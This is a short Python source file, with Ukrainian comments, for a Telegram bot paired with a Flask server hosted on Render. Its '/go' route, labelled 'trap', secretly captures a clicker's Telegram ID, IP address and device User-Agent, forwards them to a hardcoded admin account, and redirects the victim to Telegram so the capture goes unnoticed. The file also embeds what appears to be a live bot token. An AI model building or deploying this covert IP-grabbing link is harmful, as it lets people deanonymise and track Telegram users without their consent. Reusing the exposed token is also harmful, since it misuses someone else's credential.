import telebot
import os
from flask import Flask, request, redirect
from threading import Thread
from telebot import types

TOKEN = "8620930680:AAGMFBld3aXdu77gy32TO4S-fHt_rE_Zn58"
ADMIN_ID = 7853632822
# Render сам підставить URL твого сервісу в цю змінну
BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app-name.onrender.com")

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

@app.route("/go")
def trap():
    user_id = request.args.get('id')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    log_info = f"🕵️‍♂️ Клік!\n🆔 ID: {user_id}\n🌐 IP: {user_ip}\n📱 Пристрій: {user_agent}"
    try:
        bot.send_message(ADMIN_ID, log_info)
    except:
        pass
    # Перенаправлення назад у бота (заміни @YourBotUsername)
    return redirect("https://t.me") 

@app.route("/")
def home():
    return "Bot is alive", 200

def run_bot():
    bot.infinity_polling(non_stop=True)

if __name__ == "__main__":
    # Запускаємо бота як фоновий (daemon) процес
    bot_thread = Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()
    
    # Render очікує, що Flask буде слухати порт 10000
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
